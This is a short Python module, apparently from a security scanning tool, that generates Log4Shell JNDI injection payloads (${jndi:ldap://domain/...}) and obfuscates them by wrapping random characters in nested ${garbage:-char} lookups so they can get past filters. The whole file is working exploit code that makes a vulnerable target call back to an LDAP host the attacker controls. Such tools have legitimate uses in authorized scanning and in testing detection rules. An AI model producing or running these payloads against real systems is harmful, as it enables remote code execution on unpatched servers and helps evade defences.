import random
from random import getrandbits
from xing.utils import random_choices


def gen_log4j_payload(domain, payload_type=random_choices(4)):
    chars = "${{jndi:ldap://{0}/{1}}}".format(domain, payload_type)
    lst = []
    for char in chars:
        use = not getrandbits(1)
        if char == "$" or char == "{" or char == "}":
            use = False
        if use:
            lst.append(confuse_chars(char))
        else:
            lst.append(char)
    return ''.join([str(s) for s in lst])


def confuse_chars(char):
    garbageCount = random.randint(1, 3)
    i = 0
    garbage = ''
    lst = []
    while i < garbageCount:
        garbageLength = random.randint(1, 3)
        garbageWord = random_choices(garbageLength)
        i += 1
        lst.append(garbageWord)
        lst.append(":")
        garbage = ''.join(lst)
    return "${{{0}-{1}}}".format(garbage, char)
